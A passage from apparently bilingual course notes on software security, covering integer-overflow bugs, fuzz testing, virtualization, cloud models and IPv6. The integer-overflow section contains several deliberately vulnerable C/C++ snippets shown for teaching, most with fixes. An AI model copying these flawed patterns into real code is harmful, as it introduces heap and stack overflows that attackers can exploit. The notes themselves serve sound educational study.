&#123; </span><br><span class=\"line\"> \tresponse = xmalloc(nresp * <span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span> *)); </span><br><span class=\"line\"> \t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; nresp; i++) </span><br><span class=\"line\"> \t\tresponse[i] = packet_get_string(<span class=\"literal\">NULL</span>); </span><br><span class=\"line\"> &#125; </span><br></pre></td></tr></table></figure>\n<p>When  <code>nresp</code>  is 1073741824 (1073741824*4=4294967296=2**32), results in an overflow</p>\n<ul>\n<li><code>xmalloc()</code>  receives and allocates a 0-byte buffer</li>\n<li>The subsequent loop causes a heap buffer overflow (当循环试图将数据写入到  <code>response</code>  时，由于  <code>response</code>  并未真正分配内存，写入操作会覆盖其他内存区域，导致程序崩溃或被攻击者利用。)</li>\n<li>fixed:  <code>if (nresp &gt; 0 &amp;&amp; nresp &lt;= SIZE_MAX / sizeof(char *))</code></li>\n</ul>\n<ol start=\"2\">\n<li>A Real-World Vulnerability in the Handling JPEG Files</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getComment</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> len, <span class=\"type\">char</span> *src)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\"> \t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> size; </span><br><span class=\"line\"> \tsize = len ‐ <span class=\"number\">2</span>; </span><br><span class=\"line\"> \t<span class=\"type\">char</span> *comment = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(size + <span class=\"number\">1</span>); </span><br><span class=\"line\"> \t<span class=\"built_in\">memcpy</span>(comment, src, size); </span><br><span class=\"line\"> \t<span class=\"keyword\">return</span>; </span><br><span class=\"line\"> &#125; </span><br></pre></td></tr></table></figure>\n<ul>\n<li>整数下溢<br>\n在这段代码中，变量  <code>len</code>  和  <code>size</code>  被声明为无符号整数（unsigned int），这意味着它们的值不能是负数。<br>\n当  <code>len</code>  小于 2 时，计算  <code>size = len - 2</code>  会导致 整数下溢：<br>\n例如， <code>len</code>  为 1 时， <code>size</code>  将变为 0xffffffff（4294967295），即无符号整数的最大值。<br>\n下溢的原因在于无符号整数的运算特性，当减法结果为负时，会回绕（wrap around）到最大值。</li>\n<li>0 字节内存分配<br>\n在下溢的情况下，当  <code>size</code>  被设置为 0xffffffff 时，表达式  <code>size + 1</code>  变为 0。<br>\n这会导致  <code>malloc(0)</code> ，即分配一个 0 字节的缓冲区。<br>\n在许多系统中，0 字节的  <code>malloc()</code>  是合法的，它会返回一个指针，但该指针不能被写入任何数据。</li>\n<li>堆缓冲区溢出<br>\n <code>memcpy(comment, src, size)</code>  将从  <code>src</code>  复制  <code>size</code>  个字节到  <code>comment</code> ，其中  <code>size</code>  的值为 0xffffffff。<br>\n由于  <code>comment</code>  是一个 0 字节的缓冲区，这将导致 堆缓冲区溢出，可能覆盖其他堆内存区域，从而导致程序崩溃或被攻击者利用。</li>\n<li>修复</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (len &lt;= <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"type\">unsigned</span> <span class=\"type\">int</span> size = len - <span class=\"number\">2</span>;</span><br><span class=\"line\"> ...</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>Example 3</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">CopyStructs</span><span class=\"params\">(InputFile* pInFile, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> count)</span> &#123;</span><br><span class=\"line\">     <span class=\"type\">unsigned</span> <span class=\"type\">long</span> i;</span><br><span class=\"line\">     m_pStructs = new Structs[count]; </span><br><span class=\"line\">     <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; count; i++) &#123; </span><br><span class=\"line\">         <span class=\"keyword\">if</span> (!ReadFromFile(pInFile, &amp;(m_pStructs[i]))) </span><br><span class=\"line\">             <span class=\"keyword\">break</span>; </span><br><span class=\"line\">     &#125; </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The C++’s  <code>new[]</code>  operator, it is similar to  <code>malloc(count*sizeof(Structs))</code> <br>\nAllocate a buffer smaller than we need, the attacker is able to write over the buffer</p>\n<ul>\n<li>By <strong>overflowing the multiplication operation</strong> internally</li>\n</ul>\n<ol start=\"4\">\n<li>Example 4</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_BUF 256</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">BadCode</span><span class=\"params\">(<span class=\"type\">char</span> *input)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"type\">short</span> len; </span><br><span class=\"line\">     <span class=\"type\">char</span> buf[MAX_BUF]; </span><br><span class=\"line\">     len = <span class=\"built_in\">strlen</span>(input); </span><br><span class=\"line\">     <span class=\"keyword\">if</span> (len &lt; MAX_BUF) </span><br><span class=\"line\">         <span class=\"built_in\">strcpy</span>(buf, input); </span><br><span class=\"line\"> &#125; </span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>strlen()</code>  返回无符号整数<br>\n <code>strlen()</code>  返回的是无符号整数类型 <code>size_t</code> ，通常是一个 32 位或 64 位无符号整数。<br>\n <code>len</code>  被定义为一个 16 位有符号短整型 <code>short</code> ，其范围是 -32,768 到 32,767。</li>\n<li>类型截断和符号翻转<br>\n当  <code>strlen(input)</code>  返回的长度超过  <code>32,767</code>  时，赋值给  <code>short len</code>  时会发生 类型截断，导致溢出。<br>\n例如，如果  <code>strlen(input)</code>  返回 40,000，那么赋值后， <code>len</code>  的值将会变成 -25,536（溢出后的值），因为  <code>short</code>  类型的最大正值只能到 32,767。<br>\n这会将一个本应是大于 256 的值变成一个负数。</li>\n<li>缓冲区溢出风险<br>\n在类型截断后， <code>len</code>  可能是负数。条件  <code>if (len &lt; MAX_BUF)</code>  将会成立，因为负数小于 256。<br>\n这意味着，即使输入字符串的实际长度超过了 256 字节， <code>strcpy(buf, input)</code>  仍会被执行，导致缓冲区溢出。</li>\n<li>修复<br>\n <code>len = strnlen(input, MAX_BUF);</code> : The  <code>strnlen()</code>  function returns an integer value capped by  <code>MAX_BUF</code></li>\n</ul>\n<h1 id=\"Integer Overflow Prevention\" class=\"active\"><a class=\"anchor\"  href=\"#Integer Overflow Prevention\">#</a>Integer Overflow Prevention</h1>\nInteger overflow is very hard to discover and prevent\n<ol>\n<li>Runtime checks</li>\n</ol>\n<ul>\n<li>ubsan instruments binaries to be executed and checks the results of arithmetic operations</li>\n<li>Microsoft Visual C++ 2005 and later automatically catch calls to operator new that overflow</li>\n</ul>\n<ol start=\"2\">\n<li>Library support</li>\n</ol>\n<ul>\n<li>SafeInt class performs safe operations</li>\n</ul>\n<ol start=\"3\">\n<li>Static analysis tools and formal verification techniques<br>\n 在程序编译前对源代码进行分析，寻找潜在的整数溢出问题。这些工具可以检测代码中的常见整数运算错误，包括加减乘除溢出、类型转换溢出等</li>\n</ol>\n","categories":["课程笔记","Principles of Software Security"],"tags":["C","software security"]},{"title":"Fuzz testing","url":"/course/Fuzz-testing/","content":"<h1 id=\"Software testing\" class=\"active\"><a class=\"anchor\"  href=\"#Software testing\">#</a> Software testing</h1>\n<h2 id=\"Definition\" class=\"active\"><a class=\"anchor\"  href=\"#Definition\">#</a>Definition</h2>\n<ol>\n<li>The process of running a program to evaluate properties of interest</li>\n</ol>\n<ul>\n<li>Meet design requirements</li>\n<li>Produce correct results</li>\n<li>Perform within an acceptable time</li>\n<li>Reasonably usable</li>\n<li>Handle all inputs correctly</li>\n</ul>\n<ol start=\"2\">\n<li>Software Testing Steps</li>\n</ol>\n<ul>\n<li>验证（Verification）：我们是否在正确地构建产品？<br>\n任务集确保软件正确地实现了特定功能。<br>\n验证的目标是确保程序在所有可能的输入下都能正常工作。</li>\n<li>确认（Validation）：我们是否在构建正确的产品？<br>\n任务集确保软件符合客户需求。</li>\n</ul>\n<ol start=\"3\">\n<li>Test Oracles<br>\nSoftware testing determines the correctness of software under the assumption of some specific hypotheses. Compares the state and behaviour of the product against test oracles.</li>\n</ol>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/27/671dfbadce67b.png\" alt=\"img\"></p>\n<ol start=\"4\">\n<li>Types of Software Testing\n<ol>\n<li>Manual testing</li>\n</ol>\n<ul>\n<li>Without using any automated tool or any script</li>\n<li>E.g. unit testing, integration testing, system testing, user experience testing</li>\n</ul>\n<ol start=\"2\">\n<li>Automated testing</li>\n</ol>\n<ul>\n<li>Use scripts or another software to test the product</li>\n<li>E.g. regression testing, performance testing, stress testing</li>\n</ul>\n</li>\n<li>Testing levels\n<ol>\n<li>Unit testing: Test an individual component or group of inter-related components</li>\n<li>Integration testing: Individual components are combined and tested as a group</li>\n<li>System testing: Test a complete and integrated system</li>\n<li>Acceptance testing: Evaluate a system for compliance with the business requirements</li>\n</ol>\n</li>\n<li>Testing techniques and tactics\n<ol>\n<li>Regression testing: Make sure that whole system works properly after adding new components</li>\n<li>Stress testing: Test the software under extreme conditions</li>\n<li>Performance testing: Test the speed and effectiveness of the software</li>\n<li>Security testing: Test the program for security vulnerabilities</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Methods\" class=\"active\"><a class=\"anchor\"  href=\"#Methods\">#</a>Methods</h2>\n<ol>\n<li>Black-box testing: No access to the source code of the software. Only monitor the output of a system after providing a specific input\n<ol>\n<li>Treat the software as a black box</li>\n</ol>\n<ul>\n<li>Examining functionality without any knowledge of internal implementation</li>\n<li>Not biased toward an implementation</li>\n<li>But may leaves parts of the program untested</li>\n</ul>\n<ol start=\"2\">\n<li>Examples:</li>\n</ol>\n<ul>\n<li>Boundary value and all-pairs testing</li>\n<li>Model-based and specification-based testing</li>\n<li>Use case testing</li>\n<li>Fuzz testing</li>\n</ul>\n</li>\n<li>White-box testing: Access to the source code of the software\n<ol>\n<li>Verify the internal structures or workings of a program</li>\n</ol>\n<ul>\n<li>Exercise paths through the code and determine the appropriate outputs</li>\n<li>Bring more complexity to testing</li>\n</ul>\n<ol start=\"2\">\n<li>Code coverage criteria:</li>\n</ol>\n<ul>\n<li>Control flow testing</li>\n<li>Data flow testing</li>\n<li>Branch testing and decision coverage</li>\n<li>Statement coverage</li>\n</ul>\n<ol start=\"3\">\n<li>Code Coverage: Code that has not been covered by tests is likely to contain bugs</li>\n</ol>\n<ul>\n<li>Coverage = (# of elements tested) ÷ (# of elements in the program)</li>\n</ul>\n</li>\n<li>Grey-box testing: A mix of white-box and black-box tests<br>\nGrey-box testers partially know the internal structure, such as documentation of internal data structures as well as the algorithms used<br>\nThey make better-informed testing choices while testing the software from outside</li>\n</ol>\n<ul>\n<li>Can take the straightforward technique of black-box testing</li>\n<li>Still benefited from the code-targeted systems in white-box testing</li>\n</ul>\n<ol start=\"4\">\n<li>Principles of Software Testing</li>\n</ol>\n<ul>\n<li>Testing shows the presence of defects, not their absence: Testing reduces the number of defects but not a proof of correctness</li>\n<li>Exhaustive testing is impossible: For every combinations of inputs and preconditions in a nontrivial program</li>\n<li>Early testing saves time and money: Testing should start as early as possible in software development life cycle</li>\n<li>Defects cluster together: Pareto Principle in software testing: 80% of issues comes from 20% of modules</li>\n<li>Beware of the pesticide paradox: Repeating old test cases will eventually fail to find new defects</li>\n<li>Testing is context dependent: Different kinds of software are tested differently</li>\n<li>Absence-of-errors is a fallacy: Unusable software without bugs is still unusable</li>\n</ul>\n<h1 id=\"Fuzz testing\" class=\"active\"><a class=\"anchor\"  href=\"#Fuzz testing\">#</a>Fuzz testing</h1>\n<h2 id=\"Definition\" class=\"active\"><a class=\"anchor\"  href=\"#Definition\">#</a>Definition</h2>\n<ol>\n<li>What Is Fuzzing<br>\nA negative testing method that provides random or abnormal input data (fuzz) to a program</li>\n</ol>\n<ul>\n<li>Produce almost no false positive (误报)<br>\nMonitor bad behaviour in the responses</li>\n<li>For example, by crashing, or by failing built-in code assertions</li>\n<li>If the program fails, the defects can be noted</li>\n<li>If no crash is produced, inputs are mutated to produce further inputs<br>\nSoftware tools that work with fuzzing are called fuzzers</li>\n</ul>\n<ol start=\"2\">\n<li>Anatomy of a Fuzzer</li>\n</ol>\n<ul>\n<li>Fuzz targets: Small programs that test predefined API functions, similar to unit tests</li>\n<li>Fuzz generators: Create random mutations of inputs to the software under test</li>\n<li>Delivery mechanism: Process inputs from fuzz generators and feed them to the software for execution</li>\n<li>Monitoring system: Keep track of how the inputs are executed and detect triggered bugs from the<br>\nsoftware</li>\n</ul>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/27/671e081d4f722.png\" alt=\"img\"></p>\n<ol start=\"3\">\n<li>Reasons for its Success\n<ol>\n<li>Random input<br>\nNo model of program behaviour, application type, or system description\n<ul>\n<li>Random ASCII characters used to test command-line utility options</li>\n<li>Studied Unix, Linux, Windows NT and Mac OS X<br>\nAble to test hundreds of applications, each with a multitude of inputs</li>\n</ul>\n</li>\n<li>Simple criteria</li>\n</ol>\n<ul>\n<li>Pass or fail verdict for fuzzing was very simple: If the application crashes or hangs, it is considered to fail the test. Otherwise, it passes (i.e. quietly exit)</li>\n<li>Very little monitoring was used<br>\nAny means of trying to hide the failures would have left the problems undiscovered<br>\nNo memory leak or heap overflow was caught, unless they resulted in a crash</li>\n</ul>\n<ol start=\"3\">\n<li>Automated testing<br>\nThe fuzz testing was entirely automated<br>\nResults were compared across applications, operating systems, and vendors<br>\nKey differences to traditional testing practices\n<ul>\n<li>General purpose tool</li>\n<li>Extremely easy to use</li>\n<li>Find security problems</li>\n</ul>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Types of Fuzzers\" class=\"active\"><a class=\"anchor\"  href=\"#Types of Fuzzers\">#</a>Types of Fuzzers</h2>\n<ol>\n<li>Dumb fuzzing</li>\n</ol>\n<ul>\n<li>Produce input completely randomly</li>\n<li>Easy and inexpensive to set up</li>\n<li>Not efficient</li>\n</ul>\n<ol start=\"2\">\n<li>Smart fuzzing</li>\n</ol>\n<ul>\n<li>Produce inputs that are based on valid input formats</li>\n<li>Require detailed knowledge about input format</li>\n<li>Take longer to set up</li>\n</ul>\n<ol start=\"3\">\n<li>Black-box fuzzin</li>\n</ol>\n<ul>\n<li>Feed a program random inputs to see whether it crashes</li>\n<li>Advantage: easy to configure</li>\n<li>Disadvantage: inefficient search\n<ul>\n<li>Input often requires structures, random inputs are likely to be malformed</li>\n<li>Hard to generate inputs for certain paths</li>\n<li>May re-run the same path over and over again</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>White-box fuzzing</li>\n</ol>\n<ul>\n<li>Look inside the box: Use source code to guide fuzzing</li>\n<li>Can understand and assert security properties: Explore different program execution paths to check for security properties</li>\n<li>Significantly more complex\n<ul>\n<li>Need to check whether an input can violate a security property</li>\n<li>Find inputs that will go down different program execution paths</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Mutation-based fuzzing</li>\n</ol>\n<ul>\n<li>User supplies a well-formed input</li>\n<li>Fuzzer generates random changes to that input</li>\n<li>No assumption about input\n<ul>\n<li>Only assume that variants of well-formed input may be problematic</li>\n<li>Not dependent on program details</li>\n<li>May be strongly biased by the initial input!</li>\n</ul>\n</li>\n<li>Example: zzuf</li>\n</ul>\n<ol start=\"6\">\n<li>Generation-based fuzzing</li>\n</ol>\n<ul>\n<li>Generate inputs from some description of the format\n<ul>\n<li>Using specified protocols or file format info (RFC, documentation, etc.)</li>\n</ul>\n</li>\n<li>Require the user to specify a format or protocol. Or, write a generator for generating well-formatted inputs</li>\n<li>Advantage: more complete search with inputs more specific to the program operations</li>\n<li>Disadvantage: more cumbersome\n<ul>\n<li>Need specification or generator for every input format and program!</li>\n</ul>\n</li>\n<li>Example: Peach, SPIKE</li>\n</ul>\n<ol start=\"7\">\n<li>Coverage-based fuzzing</li>\n</ol>\n<ul>\n<li>Instrument the program to track coverage</li>\n<li>Maintain a pool of high-quality tests\n<ul>\n<li>Start with some initial ones specified by users</li>\n<li>Mutate tests in the pool to generate new tests</li>\n<li>Run new tests</li>\n<li>If a new test leads to new elements, save the new test to the pool</li>\n</ul>\n</li>\n<li>Example: AFL</li>\n</ul>\n<h2 id=\"Challenges\" class=\"active\"><a class=\"anchor\"  href=\"#Challenges\">#</a>Challenges</h2>\n<ol>\n<li>What Fuzzing is NOT Good for</li>\n</ol>\n<ul>\n<li>Bugs that can be found by fuzzing\n<ul>\n<li>Memory corruption errors, incorrect null handling, bad exception handling</li>\n<li>Deadlocks, infinite loops, assertion violations</li>\n</ul>\n</li>\n<li>Possible target programs:\n<ul>\n<li>Desktop applications (browsers, PDF readers, graphics, office suites)</li>\n<li>Libraries (images, audio, crypto APIs) and tools (perl, clang, gcc, sqlite)</li>\n<li>Systems (OS kernels, drivers)</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>NOT Good for</li>\n</ol>\n<ul>\n<li>Unit tests that verify that the software works as expected</li>\n<li>Finding logical security flaws\n<ul>\n<li>E.g. privilege escalation, access control, authorisation, information leakage</li>\n<li>Fuzzing won’t tell you unless you have some tests that checks for this situation</li>\n</ul>\n</li>\n<li>Testing for known bugs</li>\n<li>Memory safe code</li>\n</ul>\n<ol start=\"3\">\n<li>Challenges of Guided Fuzzing<br>\nLike any testing, fuzzing is unlikely to reach all code paths in the target program<br>\nAttempts to solve this problem\n<ul>\n<li>Corpus distillation: Select a subset of interesting seeds with simple block coverage</li>\n<li>Static analysis: Over-approximate program behaviours without running the program</li>\n<li>Symbolic or concolic execution: Symbolically execute a program to explore all feasible program paths</li>\n</ul>\n</li>\n</ol>\n","categories":["课程笔记","Principles of Software Security"],"tags":["software security"]},{"title":"IoT","url":"/course/IoT/","content":"<h1 id=\"Network Virtualization\" class=\"active\"><a class=\"anchor\"  href=\"#Network Virtualization\">#</a>Network Virtualization</h1>\n<h2 id=\"Virtual Architecture\" class=\"active\"><a class=\"anchor\"  href=\"#Virtual Architecture\">#</a>Virtual Architecture</h2>\n<ol>\n<li>虚拟化架构概述</li>\n</ol>\n<ul>\n<li>虚拟化 (Virtualization)：是某种事物的虚拟或逻辑版本，而非实际的物理版本。</li>\n<li>宿主机 (Host)：指托管虚拟机的物理计算机。</li>\n<li>来宾 (Guest)：指每个虚拟机 (VM)。</li>\n</ul>\n<ol start=\"2\">\n<li>虚拟化核心组件：</li>\n</ol>\n<ul>\n<li>Hypervisor（管理程序）：创建并管理虚拟机，同时负责在宿主机与其来宾虚拟机之间分配和共享资源。</li>\n<li>Hypervisor 类型：\n<ul>\n<li>类型 1（Type 1）：直接安装在计算机上，没有依赖操作系统，被称为裸机管理程序。</li>\n<li>类型 2（Type 2）：作为应用程序安装在宿主操作系统中，被称为托管管理程序。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>虚拟机配置：<br>\n- 虚拟机的软件和硬件特性在创建时由管理程序指定，可以根据需要进行自定义，包括：\n<ul>\n<li>安装的来宾操作系统</li>\n<li>分配的内存大小</li>\n<li>硬盘大小</li>\n<li>处理器类型等<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/fd0d57f0e9890d92.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"Network Connection Types\" class=\"active\"><a class=\"anchor\"  href=\"#Network Connection Types\">#</a>Network Connection Types</h2>\n<ol>\n<li>网络连接类型概述</li>\n</ol>\n<ul>\n<li>vNIC（虚拟网卡）：每个虚拟机 (VM) 都拥有自己的 vNIC，使其可以连接到其他机器；vNIC 工作在数据链路层。</li>\n<li>vNIC 数量：每个虚拟机可以拥有多个 vNIC，但最大数量取决于管理程序的限制。</li>\n<li>连接机制：\n<ul>\n<li>当为虚拟机选择 vNIC 时，管理程序会创建该虚拟机与宿主机之间的连接。</li>\n<li>这种连接可以被称为桥接 (bridge) 或虚拟交换机 (vSwitch)。</li>\n</ul>\n</li>\n<li>虚拟交换机 (vSwitch)：一个宿主机可以支持多个 vSwitch，这些 vSwitch 由管理程序控制。</li>\n<li>网络配置模式：vNIC 的配置方式决定了虚拟机是加入虚拟网络，还是尝试加入宿主机连接的物理局域网 (LAN)<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/3ed47c20a495478f.png\" alt=\"image\"></li>\n</ul>\n<ol start=\"2\">\n<li>Bridged Mode</li>\n</ol>\n<ul>\n<li>在桥接模式下，虚拟网卡 (vNIC) 使用主机的物理网卡 (NIC) 直接访问物理网络。</li>\n<li>虚拟机从物理网络上的 DHCP 服务器获取自己的 IP 地址、默认网关和子网掩码。</li>\n<li>对于网络中的其他节点而言，虚拟机就像是网络中的普通客户端或服务器。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/f7ea334b5d6cb4d8.png\" alt=\"image\"></li>\n</ul>\n<ol start=\"3\">\n<li>NAT Mode</li>\n</ol>\n<ul>\n<li>在 NAT 模式下，虚拟网卡 (vNIC) 依赖主机作为 NAT 设备来访问网络。</li>\n<li>虚拟机的 IP 地址信息是从主机获取的，主机的 Hypervisor 作为 DHCP 服务器提供地址分配。</li>\n<li>这种连接模式适用于不需要被其他网络节点通过已知地址访问的虚拟机。</li>\n</ul>\n<ol start=\"4\">\n<li>Host-only Mode</li>\n</ol>\n<ul>\n<li>在 Host-only 模式下，同一主机上的虚拟机可以与彼此以及主机交换数据。</li>\n<li>这些虚拟机无法与主机之外的节点进行通信。</li>\n<li>虚拟网卡 (vNIC) 不会通过主机的物理网卡 (NIC) 发送或接收数据。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/a6c11b2f0aa44aad.png\" alt=\"image\"></li>\n</ul>\n<h2 id=\"Pros and Cons of Virtualization\" class=\"active\"><a class=\"anchor\"  href=\"#Pros and Cons of Virtualization\">#</a>Pros and Cons of Virtualization</h2>\n<ol>\n<li>优点：</li>\n</ol>\n<ul>\n<li>资源利用效率高：虚拟化允许多个虚拟机（VM）共享同一个物理服务器的资源，从而提高资源利用率。</li>\n<li>成本和能源节省：通过减少对多台物理服务器的需求，企业可以节省硬件成本、电力和冷却费用。</li>\n<li>故障和威胁隔离：每个虚拟机独立运行，因此影响一个虚拟机的故障或威胁不会波及其他虚拟机。</li>\n<li>简化备份、恢复和复制：虚拟化简化了备份和恢复流程，使得创建副本和数据恢复更为便捷。</li>\n</ul>\n<ol start=\"2\">\n<li>缺点：</li>\n</ol>\n<ul>\n<li>性能下降：与专用的物理机器相比，虚拟化环境会引入额外开销，导致性能下降。</li>\n<li>复杂性增加：管理虚拟化环境需要专业知识，会增加 IT 基础设施的复杂性。</li>\n<li>许可费用增加：虚拟化平台和客户操作系统实例的许可费用可能会导致更高的成本。</li>\n<li>单点故障：如果物理主机发生故障，所有在该主机上的虚拟机可能会受到影响，除非配置了冗余或故障转移解决方案。</li>\n</ul>\n<h2 id=\"Network Functions Virtualization\" class=\"active\"><a class=\"anchor\"  href=\"#Network Functions Virtualization\">#</a>Network Functions Virtualization</h2>\n<ul>\n<li>NFV（网络功能虚拟化）：是将物理和虚拟网络架构合并的过程。</li>\n<li>优点：提供灵活且节约成本的网络设备虚拟化选项。</li>\n<li>网络设备的虚拟化选项：\n<ul>\n<li>虚拟防火墙：将防火墙的操作系统安装在一台廉价服务器上的虚拟机中。</li>\n<li>虚拟路由器：将路由器的虚拟机安装在服务器上，取代传统昂贵的硬件路由器。</li>\n</ul>\n</li>\n<li>虚拟化网络功能的优势：\n<ul>\n<li>快速迁移：在硬件故障或维护的情况下，虚拟设备可以快速且有时自动地从一台服务器迁移到另一台。</li>\n<li>资源利用效率更高：物理资源的分配和利用更为高效。</li>\n<li>服务易于扩展：能够根据网络需求的变化灵活调整服务规模</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Cloud Architecture\" class=\"active\"><a class=\"anchor\"  href=\"#Cloud Architecture\">#</a>Cloud Architecture</h2>\n<ul>\n<li>云计算：指通过网络灵活地向多个客户端提供数据存储、应用程序和服务的模式。</li>\n<li>云计算的特征包括：\n<ul>\n<li>按需服务：用户可以根据需求动态调整使用的服务。</li>\n<li>广泛的网络访问：通过互联网或其他网络广泛访问云资源。</li>\n<li>资源池化：将物理或虚拟资源集成在一起，按需分配给用户。</li>\n<li>计量服务：按使用量进行计费，确保用户只为实际使用的资源付费。</li>\n<li>快速弹性：存储容量可以迅速或自动地进行扩展或缩减，以适应需求的变化。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/7507bb3ce4dfd68e.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Cloud Service Models</li>\n</ol>\n<ul>\n<li>本地部署 (On-premises)：所有硬件、软件及其他资源均位于组织所在地并由其管理。</li>\n<li>IaaS (Infrastructure as a Service 基础设施即服务)：虚拟提供硬件服务和网络基础设施设备，包含如 HVDs（托管虚拟桌面）等终端用户接口。</li>\n<li>PaaS (Platform as a Service 平台即服务)：提供操作系统、操作系统提供给应用程序的运行时库或模块，以及运行操作系统的硬件。</li>\n<li>SaaS (Software as a Service 软件即服务)：直接提供应用程序。</li>\n<li>XaaS (Anything as a Service 万物即服务)：根据客户的具体需求，云可以提供任何功能的组合。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>服务模型</th>\n<th>由用户提供</th>\n<th>由供应商提供</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>On-premises</td>\n<td>应用程序、数据存储、操作系统、虚拟化、服务器、存储、网络</td>\n<td>无</td>\n</tr>\n<tr>\n<td>IaaS</td>\n<td>应用程序、数据存储、操作系统</td>\n<td>虚拟化、服务器、存储、网络</td>\n</tr>\n<tr>\n<td>PaaS</td>\n<td>应用程序、数据存储</td>\n<td>操作系统、虚拟化、服务器、存储、网络</td>\n</tr>\n<tr>\n<td>SaaS</td>\n<td>无</td>\n<td>应用程序、数据存储、操作系统、虚拟化、服务器、存储、网络</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"3\">\n<li>Cloud Deployment Models 云部署模型</li>\n</ol>\n<ul>\n<li>公有云 (Public cloud)：通过公共传输线路提供的服务。</li>\n<li>私有云 (Private cloud)：由组织在其自有数据中心的服务器上建立的服务。</li>\n<li>社区云 (Community cloud)：在多个组织之间共享的服务。</li>\n<li>混合云 (Hybrid cloud)：将多种服务模型组合到一个部署中。</li>\n<li>多云 (Multicloud)：在单一部署中组合了多种服务。</li>\n</ul>\n<ol start=\"4\">\n<li>Orchestration and Automation</li>\n</ol>\n<ul>\n<li>IaC（infrastructure as code 基础设施即代码）：IaC 是通过计算机可读的配置文件中使用文本命令来创建和管理云资源的过程。它允许对云资源的更改进行日志记录，使得基础设施管理更简单，并且可以进行版本控制。</li>\n<li>自动化 (Automation)：自动化是指计算机对特定事件的编程响应。通过编写脚本，某些任务可以在无需人工干预的情况下自动运行。</li>\n<li>编排 (Automation)：编排指的是将多个任务或工作流进行协调和自动化，以使它们协同工作，形成一个复杂的、统一的流程。随着越来越多的云维护和安全任务被转换为代码，编排能够帮助将复杂的过程整合成自动化工作流。</li>\n</ul>\n<ol start=\"5\">\n<li>Connectivity and Security</li>\n</ol>\n<ul>\n<li>Potential risks and limitations include the following:\n<ul>\n<li>ISP outages</li>\n<li>ISP-imposed bandwidth limitations</li>\n<li>Cloud provider’s outages</li>\n<li>Cloud provider’s backup and security systems</li>\n<li>Misconfiguration that exposes one client’s data to another client</li>\n<li>Unauthorized access to data by cloud provider employees or illegitimate users</li>\n<li>Breaches of confidentiality</li>\n<li>Failure to comply with data security regulations</li>\n<li>Questions over ownership of intellectual property stored in the cloud</li>\n<li>Questions over data maintenance</li>\n<li>Risk to the network, proprietary data, or customer information caused by BYOC</li>\n</ul>\n</li>\n<li>Way to reduce risks of cloud computing include the following:\n<ul>\n<li>Use encryption</li>\n<li>Carefully choose the method by which your network connects to your cloud resources</li>\n<li>Consider the following methods:\n<ul>\n<li>Internet</li>\n<li>VPN (virtual private network)</li>\n<li>Remote access connections</li>\n<li>Leased line</li>\n<li>Dedicated direct connection</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"IPv6\" class=\"active\"><a class=\"anchor\"  href=\"#IPv6\">#</a>IPv6</h1>\n<ol>\n<li>Internet Protocol v6 (IPv6)</li>\n</ol>\n<ul>\n<li>IPv6 (RFC 2460)：下一代互联网协议</li>\n<li>完全重新设计 IP 地址体系</li>\n<li>分层的 128 位地址，具有独立的主机标识符</li>\n<li>无状态自动配置：无需手动配置即可自动生成地址</li>\n<li>简化路由和地址管理，提高网络效率</li>\n<li>尽管大部分流量尚未转换到 IPv6，但：\n<ul>\n<li>大多数 PC 操作系统已具备 IPv6 支持</li>\n<li>各国政府开始要求部署 IPv6</li>\n<li>大多数路由器已支持 IPv6<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/e2016f84ba1bfc1f.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>IPv6 术语：</li>\n</ol>\n<ul>\n<li>Link（链路）：也称为本地链路，是由路由器界定的任何局域网</li>\n<li>Neighbors（邻居）：同一链路上的两个或多个节点</li>\n<li>Dual stacked（双栈）：网络配置为同时使用 IPv4 和 